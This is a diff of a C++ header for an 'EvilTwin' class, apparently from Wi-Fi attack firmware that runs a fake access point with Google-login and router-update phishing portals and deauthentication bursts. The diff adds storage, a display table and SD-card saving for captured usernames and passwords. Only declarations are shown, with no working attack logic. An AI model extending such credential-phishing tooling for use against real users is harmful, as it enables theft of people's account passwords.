@@ -8,8 +8,15 @@
 #include "display_manager.h"
 #include "sdcard_manager.h"
 
-#define ET_LOG_PATH  "/logs/eviltwin.csv"
-#define ET_PER_PAGE  8
+#define ET_LOG_PATH       "/logs/eviltwin.csv"
+#define ET_PER_PAGE       8
+#define ET_MAX_CREDS      20
+#define ET_CREDS_PER_PAGE 5
+
+struct CapturedCred {
+    char user[48];
+    char pass[48];
+};
 
 class EvilTwin {
 public:
@@ -26,9 +33,10 @@ private:
     // portal state
     char  _ssid[33];
     int   _tmpl;          // 0=Google login  1=Router update
-    int   _captureCount;
-    char  _lastUser[48];
-    char  _lastPass[48];
+    int           _captureCount;
+    char          _lastUser[48];
+    char          _lastPass[48];
+    CapturedCred  _creds[ET_MAX_CREDS];
     bool  _dirty;
 
     // client tracking (event-based — more reliable than softAPgetStationNum)
@@ -66,6 +74,8 @@ private:
     // -- runtime --
     void drawScreen();
     void sendDeauthBurst();
+    void showCredsTable();
+    void saveCredsToSD();
 };
 
 #endif // EVILTWIN_H
